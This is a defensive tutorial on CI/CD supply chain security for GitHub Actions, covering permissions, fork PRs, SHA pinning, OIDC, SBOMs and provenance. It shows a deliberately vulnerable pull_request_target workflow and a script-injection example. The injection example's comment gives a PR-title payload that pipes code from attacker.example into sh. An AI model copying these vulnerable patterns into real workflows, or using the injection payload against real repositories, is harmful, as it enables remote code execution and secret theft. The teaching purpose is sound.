# Pipeline and Supply Chain Security

A CI/CD pipeline is one of the most privileged systems a team runs. It
can push to the repository, publish packages, and deploy to production,
and it executes code from many sources: your developers, outside
contributors' pull requests, third-party actions, and hundreds of
dependencies. Attackers know this; compromising one build step can be
easier and more valuable than attacking production directly.

This lesson covers least-privilege `permissions`, how secrets behave with
fork pull requests, the `pull_request_target` risk, script injection
through untrusted input, pinning third-party actions to full commit
SHAs, Dependabot and dependency review, OIDC federation instead of
long-lived cloud keys (with an AWS example), software bills of materials
(SBOMs), artifact attestations and SLSA provenance, and secret scanning
with push protection.

## Why it matters

Real supply chain attacks have followed exactly these paths. In 2021 an
attacker modified Codecov's Bash Uploader script, which thousands of CI
pipelines downloaded and ran, so it exported environment variables
(credentials, tokens, keys) from customers' CI runs for about two months.
In March 2025 the widely used `tj-actions/changed-files` GitHub Action
was compromised: its version tags were repointed to malicious code that
printed CI secrets into workflow logs, which are public for public
repositories. Both attacks needed nothing from the victims except that
their pipelines trusted a mutable dependency and had secrets within
reach. The defenses on this page are mostly configuration: cheap to
adopt, and they shrink both the chance and the blast radius of the next
incident.

## Real-world usage

- **Codecov, 2021.** Codecov's
  [Bash Uploader security update](https://about.codecov.io/security-update/)
  explains that a credential leaked from its Docker image creation
  process let an attacker alter the uploader script, so any credentials,
  tokens, or keys available in customers' CI environments could be sent
  to a third-party server between January 31 and April 1, 2021. A customer
  detected it by comparing the script's checksum, the kind of integrity
  check this page recommends.
- **tj-actions/changed-files, 2025.** CISA's alert
  [Supply Chain Compromise of Third-Party tj-actions/changed-files (CVE-2025-30066)](https://www.cisa.gov/news-events/alerts/2025/03/18/supply-chain-compromise-third-party-tj-actionschanged-files-cve-2025-30066-and-reviewdogaction)
  describes the compromise, which exposed secrets such as access keys,
  GitHub personal access tokens, npm tokens, and private keys, was
  potentially enabled by a compromise of `reviewdog/action-setup`, and
  advises rotating any exposed secrets. Workflows that pinned the action
  to a full commit SHA did not run the malicious code.
- **GitHub Security Lab.** The articles
  [Preventing pwn requests](https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/)
  and
  [Untrusted input](https://securitylab.github.com/resources/github-actions-untrusted-input/)
  document how `pull_request_target` combined with checking out PR code,
  and expressions interpolated into scripts, let outside contributors
  run code with write access and secrets.
- **SLSA and GitHub attestations.** The
  [SLSA build levels](https://slsa.dev/spec/v1.0/levels) define provenance
  requirements (L1 provenance exists, L2 signed provenance from a hosted
  build platform, L3 a hardened build platform), and GitHub's
  [artifact attestations](https://docs.github.com/en/actions/concepts/security/artifact-attestations)
  state that attestations alone provide SLSA v1.0 Build Level 2, and that
  building in a shared reusable workflow can meet Build Level 3.

**Popular tools and providers:** GitHub Advanced Security, sold since 2025
as GitHub Secret Protection (secret scanning, push protection) and GitHub
Code Security (code scanning, dependency review), Dependabot
and Renovate, `actions/attest` and the GitHub CLI's `gh attestation`,
Sigstore and cosign, Syft and `npm sbom` for SBOMs, OpenSSF Scorecard,
zizmor and actionlint for workflow analysis, gitleaks, and cloud OIDC
federation (AWS, Google Cloud, Azure).

## How it works

### The pipeline's attack surface

![Diagram: five pipeline stages with threats above and defenses below; source and PRs face stolen developer tokens, malicious fork PRs, and force pushes, defended by 2FA, branch rulesets, CODEOWNERS, reviews, and signed commits; workflows and triggers face pwn requests where fork code runs with a write token and script injection from PR titles or branch names, defended by using pull_request for forks, passing untrusted input via env, and zizmor and actionlint; actions and dependencies face retagged third-party actions, malicious npm releases, and typosquatting, defended by pinning actions to SHAs, lockfiles with npm ci, dependency review, and Dependabot cooldown; runner and secrets face secrets dumped to logs, long-lived cloud keys, cache poisoning, and persistent runners, defended by least-privilege tokens, OIDC short-lived credentials, environment-scoped secrets, and ephemeral runners; artifacts and deploy face replaced or retagged images and unverified provenance, defended by deploying by digest, attestations and SBOMs, and verifying before deploy.](pipeline-attack-surfaces.svg)

Two principles organize the defenses:

1. **Assume any code in the pipeline may be hostile:** PR code, actions,
   dependencies, and build scripts. Limit what it can reach.
2. **Keep credentials short-lived, narrowly scoped, and separated** from
   untrusted code paths, so a compromise exposes as little as possible.

### Least-privilege permissions

The `GITHUB_TOKEN` can do whatever its permissions allow, and every step
in the job (including third-party actions and your dependencies'
install scripts) can read it. Grant the minimum:

- Set the organization or repository default to read-only.
- Put `permissions: contents: read` at the top of every workflow.
- Grant extra scopes only on the jobs that need them (`packages: write`
  on the publish job, `id-token: write` on the deploy job).
- Set `persist-credentials: false` on `actions/checkout` unless a later
  step must push.

A compromised dependency in a job with `contents: read` can read your
code (which it already has); in a job with `contents: write` it can push
a backdoor to `main`.

### Secrets and fork pull requests

For `pull_request` events from **forks**, GitHub gives the workflow a
read-only `GITHUB_TOKEN` and **no secrets** (Dependabot PRs similarly
receive only Dependabot secrets). This is deliberate: the PR's code runs
in the job, and its author is untrusted. Repository settings can also
require approval before workflows run for first-time or outside
contributors.

Masking replaces secret values in logs with `***`, but it is not a
security boundary: code that can read a secret can encode it, send it
over the network, or split it to defeat masking. The only reliable
protection is not exposing secrets to untrusted code at all: keep PR
checks secret-free, run secret-dependent jobs after merge, and scope
production secrets to protected environments.

### The pull_request_target risk

`pull_request_target` runs in the context of the **base** repository: the
workflow file comes from the base branch, the token can write, and secrets
are available. That is safe for jobs that only handle metadata (labeling,
commenting) and never execute PR code. It becomes a **"pwn request"** when
the workflow checks out the PR's head and runs it:

```yaml
# DANGEROUS: do not do this
on: pull_request_target
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v7
        with:
          ref: ${{ github.event.pull_request.head.sha }}   # attacker-controlled code
      - run: npm ci && npm test                             # runs it with secrets in reach
```

Any fork can change `package.json` scripts or tests and run arbitrary code
with write access and secrets. Current versions of `actions/checkout`
refuse to check out fork PR code under `pull_request_target` and
`workflow_run` unless you set `allow-unsafe-pr-checkout: true`, which is a
strong hint never to do it. If a privileged follow-up step needs PR
results (for example to post a coverage comment), run the PR code in an
unprivileged `pull_request` workflow, upload its output as an artifact,
and let a separate `workflow_run` workflow treat that artifact strictly as
data.

### Script injection through untrusted input

Expressions are expanded **before** the shell runs. If an attacker
controls the value, they control the script:

```yaml
# VULNERABLE: a PR titled  x"; curl https://attacker.example/x | sh; echo "  runs the attacker's command
- run: echo "Checking ${{ github.event.pull_request.title }}"
```

Untrusted values include PR and issue titles and bodies, comments, branch
names, commit messages, author names, and `workflow_dispatch` inputs from
less-privileged users. Pass them through environment variables, which the
shell treats as data, and quote them:

```yaml
# SAFE: the value is never parsed as script
- env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "Checking $PR_TITLE"
```

Static analyzers such as **zizmor** and **actionlint** flag these
patterns automatically.

### Pinning third-party actions

`uses: owner/action@v4` references a **tag**, and tags can be moved, which
is exactly what happened with `tj-actions/changed-files`. A full 40-character
commit SHA cannot be changed to point at different code:

```yaml
- uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
```

Practical rules:

- Pin every third-party action to a full SHA, with the version in a
  comment so humans and Dependabot can read it.
- Let Dependabot (`package-ecosystem: github-actions`) propose SHA updates
  as reviewable PRs.
- Restrict which actions may run with organization or repository policy
  (allowlists); GitHub's Actions policy can also require that actions be
  pinned to a full-length commit SHA, failing workflows that use tags.
- Prefer fewer actions: a two-line `run:` step is often safer than a
  dependency.
- Remember that a pinned action can still download mutable code at run
  time (a Docker image by tag, a script by URL); review what it does.

### Dependencies: lockfiles, Dependabot, dependency review

Most code in TaskFlow API was written by someone else. Controls that keep
dependencies trustworthy:

- **Lockfiles and `npm ci`:** install exactly the reviewed versions with
  integrity hashes; never `npm install` in CI.
- **Registry signatures:** `npm audit signatures` verifies registry
  signatures and provenance attestations of installed packages.
- **Dependabot:** security updates open PRs for known vulnerabilities;
  version updates keep dependencies current, and by default wait 3 days
  after a release before proposing it (the `cooldown` setting), which
  avoids picking up a malicious release in its first hours.
- **Dependency review:** on each PR, `actions/dependency-review-action`
  shows which dependencies change and fails the check if a new one has a
  known vulnerability above your threshold or a disallowed license.
- **Scoped private packages:** publish internal packages under an npm
  scope mapped to your private registry, so a public package with the same
  name cannot be installed by mistake (dependency confusion).
- **Install scripts:** `postinstall` scripts run arbitrary code during
  `npm ci`; review new dependencies that use them.

### OIDC instead of long-lived cloud keys

Storing an AWS access key as a repository secret means a long-lived
credential that any job with the secret (or any code that steals it) can
use from anywhere, until someone rotates it. OpenID Connect replaces it
with short-lived credentials issued per run:

![Diagram: sequence with four lifelines; 1, the Actions job with id-token write requests an ID token for audience sts.amazonaws.com from GitHub's OIDC provider; 2, the provider returns a short-lived signed JWT with subject repo:example/taskflow-api:environment:production plus iss, aud, sha, ref, workflow, and run_id claims; 3, the job calls AWS STS AssumeRoleWithWebIdentity with the role and the JWT; 4, STS verifies the signature with the provider's keys and checks the aud and sub conditions in the role's trust policy; 5, STS returns temporary credentials valid for one hour; 6, the job pushes the image and deploys; no long-lived cloud keys are stored in GitHub, and a token from another repository, branch, or environment does not match the trust policy and is refused.](oidc-token-exchange.svg)

The security comes from the **trust policy conditions**. The `sub`
(subject) claim encodes where the run came from:

| Workflow context | `sub` claim |
|---|---|
| Job with `environment: production` | `repo:example/taskflow-api:environment:production` |
| Push to a branch (no environment) | `repo:example/taskflow-api:ref:refs/heads/main` |
| Pull request | `repo:example/taskflow-api:pull_request` |

A trust policy that only accepts the production environment's subject
means a workflow in another repository, on another branch, or in a PR
cannot assume the production role, even with `id-token: write`. Never use
a wildcard such as `repo:example/*` for a role that can deploy.

### SBOMs

A **software bill of materials** lists every component in an artifact:
packages, versions, licenses, and hashes, in a standard format (SPDX or
CycloneDX). When the next widely exploited vulnerability is announced, an
SBOM per release answers "are we affected, and where?" in minutes. Generate
it in CI from the lockfile (`npm sbom`) or the built image (BuildKit's
`sbom: true`, or Syft), store it with the release, and optionally attest
it.

### Provenance, attestations, and SLSA

**Provenance** is a signed statement of how an artifact was built: which
repository, commit, workflow, and build platform produced which digest.
Consumers verify it before deploying, which defeats artifacts built on a
laptop or swapped in a registry.

| SLSA Build level | Requirement | Protects against |
|---|---|---|
| L0 | None | (nothing) |
| L1 | Provenance exists, showing how the package was built | Mistakes; easy to forge |
| L2 | Signed provenance generated by a hosted build platform | Tampering after the build |
| L3 | Hardened build platform: runs isolated from each other, signing material inaccessible to user build steps | Tampering during the build |

On GitHub, `actions/attest` creates signed provenance for an artifact or
image digest (stored by GitHub and optionally pushed to the registry), and
`gh attestation verify` checks it. GitHub states that attestations provide
SLSA Build Level 2 on their own, and building in a shared reusable
workflow can reach Level 3. npm has the same idea: packages published via
trusted publishing from GitHub Actions get provenance automatically.

### Secret scanning and push protection

**Secret scanning** detects known credential formats in repository content
and history and raises alerts (and for many providers, notifies the issuer
so the token can be revoked). **Push protection** blocks a push that
contains a detected secret before it ever reaches the repository; a user
can bypass with a stated reason, which creates an alert and an audit
entry. Push protection for users is on by default for pushes to public
repositories; enable it for your repositories and organization too, and
pair it with a pre-commit scanner such as gitleaks for earlier feedback.

### Runners and caches

- **Self-hosted runners** on public repositories let any fork PR run code
  on your machine; if the runner persists, the next job (perhaps a
  deploy) inherits whatever was left behind. Use GitHub-hosted runners for
  untrusted code, or ephemeral self-hosted runners that are destroyed after
  one job, isolated from internal networks.
- **Caches** shared between low-trust and high-trust workflows can be
  poisoned. Do not cache in release or deploy workflows unless you must
  (`package-manager-cache: false` on `actions/setup-node`), and never
  cache secrets.

## When to use and when not to use

| Control | Use when | Notes |
|---|---|---|
| `permissions` block | Every workflow | No exceptions |
| SHA pinning | Every third-party action | Official `actions/*` too, ideally; at least a major version tag kept current |
| `pull_request_target` | Labeling, triage, comments that never run PR code | Never with a checkout of the PR head |
| OIDC federation | Any cloud or service that supports it | Fall back to secrets only when no OIDC option exists, and scope them to environments |
| Dependency review | Every PR to a deployed codebase | Requires the dependency graph; private repositories need the feature on their plan |
| Attestations and provenance | Published artifacts, images deployed to production | Verify them at deploy time, or they only document |
| SBOMs | Releases and production images | Store with the release; regenerate per build |
| Ephemeral runners | Self-hosted runners that may see untrusted code | Persistent runners only for trusted, private repositories |

## Practical examples

### A hardened CI workflow skeleton

```yaml
# .github/workflows/ci.yml
name: CI
on:
  pull_request:
  push:
    branches: [main]

permissions:
  contents: read                     # everything else is "none"

jobs:
  test:
    runs-on: ubuntu-latest
    timeout-minutes: 15
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          persist-credentials: false
      - uses: actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1 # v7.1.0
        with:
          node-version-file: .nvmrc
          cache: npm
      - run: npm ci
      - run: npm audit signatures    # registry signatures and provenance
      - run: npm test
      - name: Report the branch safely
        env:
          HEAD_REF: ${{ github.head_ref }}   # attacker-controllable: pass as data
        run: |
          echo "Tested branch: $HEAD_REF" >> "$GITHUB_STEP_SUMMARY"

  workflow-lint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          persist-credentials: false
      - run: pipx run zizmor .github/workflows/
```

### Dependabot for npm, actions, and Docker

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: npm
    directory: /
    schedule:
      interval: weekly
    cooldown:
      default-days: 7                # wait a week before proposing new versions
    groups:
      dev-dependencies:
        dependency-type: development
        update-types: [minor, patch]

  - package-ecosystem: github-actions
    directory: /
    schedule:
      interval: weekly
    groups:
      actions:
        patterns: ["*"]              # one PR updates all pinned SHAs

  - package-ecosystem: docker
    directory: /
    schedule:
      interval: weekly
```

Security updates are separate from these version updates and are not
delayed by the cooldown.

### Dependency review on every pull request

```yaml
# .github/workflows/dependency-review.yml
name: dependency review
on:
  pull_request:

permissions:
  contents: read
  pull-requests: write               # post the summary comment

jobs:
  review:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/dependency-review-action@a1d282b36b6f3519aa1f3fc636f609c47dddb294 # v5.0.0
        with:
          fail-on-severity: high
          allow-licenses: MIT, Apache-2.0, BSD-2-Clause, BSD-3-Clause, ISC
          comment-summary-in-pr: on-failure
```

### OIDC from GitHub Actions to AWS

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "Federated": "arn:aws:iam::123456789012:oidc-provider/token.actions.githubusercontent.com"
      },
      "Action": "sts:AssumeRoleWithWebIdentity",
      "Condition": {
        "StringEquals": {
          "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",
          "token.actions.githubusercontent.com:sub": "repo:example/taskflow-api:environment:production"
        }
      }
    }
  ]
}
```

This is the trust policy of the IAM role `taskflow-deploy-production`,
which only the `production` environment of one repository can assume. The
account needs an IAM OIDC identity provider for
`token.actions.githubusercontent.com` with audience `sts.amazonaws.com`.

```yaml
# .github/workflows/deploy-production.yml (excerpt)
jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: production          # sub = repo:example/taskflow-api:environment:production
    permissions:
      contents: read
      id-token: write                # allow this job to request an OIDC token
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          persist-credentials: false
      - uses: aws-actions/configure-aws-credentials@e1253824e5c10ff9df46874f81ed3ec929e19cfd # v6.3.0
        with:
          role-to-assume: arn:aws:iam::123456789012:role/taskflow-deploy-production
          aws-region: us-east-1
      - run: aws sts get-caller-identity   # prints the assumed role, proving no static keys
      - env:
          IMAGE: ${{ vars.IMAGE_REPOSITORY }}@${{ inputs.digest }}
        run: ./scripts/deploy.sh production "$IMAGE"
```

No AWS secret exists in GitHub. The temporary credentials expire after
the session duration (one hour by default), and the role's permission
policy should allow only what the deploy needs.

### Build, SBOM, provenance, and verification

```yaml
# .github/workflows/publish-image.yml (excerpt)
jobs:
  publish:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      packages: write                # push to ghcr.io
      id-token: write                # sign the attestation (Sigstore)
      attestations: write            # store the attestation
      artifact-metadata: write       # storage record for the attestation
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          persist-credentials: false
      - uses: docker/setup-buildx-action@f87e5991a6d7451dcb8d9637bfbc97413f497069 # v4.4.1
      - uses: docker/login-action@8aa5831fb8d48d8f76594c7ddde61ae58019f550 # v4.8.0
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}
      - id: push
        uses: docker/build-push-action@c3c9e263c25d99ce0380d002d59b67737d91b0dc # v7.4.0
        with:
          context: .
          push: true
          tags: ghcr.io/example/taskflow-api:sha-${{ github.sha }}
          sbom: true                 # BuildKit SBOM attached to the image
          provenance: mode=max       # BuildKit provenance attached to the image
      - uses: actions/attest@1e69f48acb82d1966a394da916b4c1698aa569d6 # v4.2.2
        with:
          subject-name: ghcr.io/example/taskflow-api
          subject-digest: ${{ steps.push.outputs.digest }}
          push-to-registry: true
```

```bash
# Before deploying (or in an admission controller), verify where the image came from
gh attestation verify oci://ghcr.io/example/taskflow-api@sha256:<digest> \
  --owner example

# Lockfile-based SBOM for the release assets
npm sbom --sbom-format cyclonedx > taskflow-api.cdx.json
```

Verification fails for an image built anywhere other than this
organization's workflows, so a pushed or swapped image cannot be deployed
silently. Without `push-to-registry`, attestations are still stored by
GitHub and can be verified the same way.

### Respond to a compromised dependency or action

```bash
# 1. Find workflows that used the compromised action
gh search code "tj-actions/changed-files" --owner example --extension yml

# 2. Find runs in the exposure window and check their logs for leaked values
gh run list --repo example/taskflow-api --created 2025-03-12..2025-03-15 --limit 200

# 3. Rotate every secret those workflows could read (tokens, keys, npm tokens)
# 4. Pin the action to a reviewed SHA or replace it with a few lines of shell
```

Rotation comes first: once a secret may have been printed or exfiltrated,
it must be treated as compromised regardless of what the logs show.

## Best practices

- Default `GITHUB_TOKEN` to read-only and grant scopes per job.
- Never run PR code from forks with secrets or write tokens; avoid
  `pull_request_target` with PR checkouts entirely.
- Pass untrusted input through `env:`; lint workflows with zizmor or
  actionlint in CI.
- Pin actions to full SHAs, enforce it by policy, and update through
  Dependabot.
- Install with lockfiles and `npm ci`, verify registry signatures, run
  dependency review on PRs, and use a cooldown for new versions.
- Use OIDC for cloud access with trust policies bound to repository and
  environment; keep remaining secrets in protected environments.
- Generate SBOMs and provenance for every production artifact, and verify
  provenance before deploying.
- Enable secret scanning and push protection; scan before commit too.
- Use ephemeral runners for anything that might run untrusted code, and
  avoid caches in privileged workflows.
- Have a playbook: which secrets each workflow can reach, and how to rotate
  them quickly.

## In production

- **A security advisory says an action you use was compromised.**
  *Detect:* advisory or alert; `gh search code` finds the action in your
  workflows. *Cause:* a tag-referenced action was repointed to malicious
  code. *Fix:* rotate every secret those workflows could access, review
  run logs in the exposure window, pin to a verified SHA or remove the
  action, and enforce SHA pinning by policy.
- **A fork PR's workflow pushed a commit to `main`.**
  *Detect:* an unexpected commit authored by the Actions bot; the run was
  a `pull_request_target` event. *Cause:* a pwn request: the workflow
  checked out and executed PR code with a write token. *Fix:* revert,
  rotate secrets, switch to `pull_request` for untrusted code, and split
  privileged follow-up work into a `workflow_run` workflow that treats PR
  output as data.
- **A PR titled with shell syntax ran commands in CI.**
  *Detect:* unexpected network calls or output in a run triggered by an
  issue or PR event. *Cause:* `${{ github.event.*.title }}` interpolated
  into `run:`. *Fix:* move untrusted values into `env:`, add zizmor to CI,
  and audit other workflows for the same pattern.
- **An old AWS access key from CI appears in an attacker's activity.**
  *Detect:* CloudTrail shows API calls from unknown IPs with a key used
  by GitHub Actions. *Cause:* a long-lived key stored as a secret and
  leaked from logs, a dependency, or a former employee's copy. *Fix:*
  deactivate the key, investigate, and replace it with OIDC role
  assumption bound to repository and environment.
- **Staging deployed an image nobody built in CI.**
  *Detect:* `gh attestation verify` fails for the running digest, or
  there is no CI run producing it. *Cause:* someone pushed an image from a
  laptop with registry write access. *Fix:* remove human push rights,
  require attestation verification before deploy, and deploy only digests
  produced by the release workflow.
- **A malicious package version was installed within hours of release.**
  *Detect:* dependency alerts or unusual install-time network activity.
  *Cause:* automatic upgrades with no delay and no review. *Fix:* pin
  through lockfiles, use Dependabot's cooldown, review dependency diffs
  with dependency review, and rotate anything the install could reach.

## Important terminology

- **Supply chain attack:** Compromising software through its dependencies,
  tools, or build process rather than directly.
- **Least privilege:** Granting only the permissions a task needs.
- **Pwn request:** Running untrusted PR code in a privileged
  `pull_request_target` context.
- **Script injection:** Untrusted input interpreted as code because it was
  interpolated into a script.
- **SHA pinning:** Referencing an action by full commit SHA instead of a
  movable tag.
- **Dependency review:** A PR check that reports vulnerable or disallowed
  dependency changes.
- **Dependency confusion:** Installing a public package that impersonates
  an internal package name.
- **OIDC federation:** Exchanging a short-lived identity token for cloud
  credentials without stored keys.
- **Trust policy:** The cloud-side rule deciding which token claims may
  assume a role.
- **SBOM:** A machine-readable list of an artifact's components.
- **Provenance:** A signed record of how and where an artifact was built.
- **Attestation:** A signed statement about an artifact, such as its
  provenance or SBOM.
- **SLSA:** A framework of supply chain security levels for builds.
- **Push protection:** Blocking pushes that contain detected secrets.

## Common mistakes and misconceptions

- Believing secret masking prevents exfiltration.
- Using `pull_request_target` to "fix" missing secrets on fork PRs.
- Pinning actions to tags and calling it pinned.
- Granting `write-all` because one step needed a write scope.
- Trusting a wildcard OIDC subject such as `repo:example/*` for
  production roles.
- Generating SBOMs and attestations but never verifying or using them.
- Running fork PRs on persistent self-hosted runners.
- Rotating secrets only after confirming misuse, instead of immediately.

## Revision questions

1. Why do fork PRs not receive secrets, and why is switching to
   `pull_request_target` the wrong fix?
2. Show a vulnerable `run:` step with script injection and rewrite it
   safely.
3. Why does pinning to a full commit SHA protect against the
   `tj-actions/changed-files` style of attack, and what does it not
   protect against?
4. Walk through the OIDC exchange between a GitHub Actions job and AWS,
   naming the claims the trust policy checks.
5. A role trusts `repo:example/taskflow-api:ref:refs/heads/*`. What can
   go wrong, and what subject would you use for production deploys?
6. What does each SLSA Build level from L1 to L3 add, and which level do
   GitHub artifact attestations reach on their own?
7. A workflow has 6 jobs; only one publishes to GHCR and one deploys with
   OIDC. With `permissions: write-all` at the top, how many jobs hold
   write tokens they do not need, and what should the permissions look
   like? (Four or more; `contents: read` at the top, `packages: write` on
   the publish job, `id-token: write` on the deploy job.)
8. What should happen, in order, when a dependency used in CI is reported
   compromised?

## Further learning

- [GitHub Docs: Secure use reference for GitHub Actions](https://docs.github.com/en/actions/reference/security/secure-use)
- [GitHub Security Lab: Preventing pwn requests](https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/)
  and [Untrusted input](https://securitylab.github.com/resources/github-actions-untrusted-input/)
- [GitHub Docs: OpenID Connect](https://docs.github.com/en/actions/concepts/security/openid-connect)
  and [OIDC in AWS](https://docs.github.com/en/actions/how-tos/secure-your-work/security-harden-deployments/oidc-in-aws)
- [GitHub Docs: Artifact attestations](https://docs.github.com/en/actions/concepts/security/artifact-attestations)
- [GitHub Docs: About dependency review](https://docs.github.com/en/code-security/supply-chain-security/understanding-your-software-supply-chain/about-dependency-review)
- [GitHub Docs: Dependabot options reference](https://docs.github.com/en/code-security/dependabot/working-with-dependabot/dependabot-options-reference)
- [GitHub Docs: About push protection](https://docs.github.com/en/code-security/secret-scanning/introduction/about-push-protection)
- [SLSA: Build track basics](https://slsa.dev/spec/v1.2/build-track-basics)
- [OpenSSF Scorecard](https://github.com/ossf/scorecard) and
  [zizmor](https://github.com/zizmorcore/zizmor)
- Next: [CI/CD interview questions and answers](interview-questions-and-answers.md). Back to the
  [CI/CD overview](../ci-cd.md).
